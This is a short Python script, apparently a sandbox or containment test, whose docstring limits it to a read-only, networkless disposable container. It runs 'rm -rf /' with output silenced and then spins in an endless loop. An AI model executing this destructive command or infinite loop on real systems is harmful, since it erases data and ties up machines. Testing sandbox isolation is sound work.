"""Run only inside a read-only, unprivileged, networkless disposable container."""

import os

os.system("rm -rf / >/dev/null 2>&1")
while True:
    pass
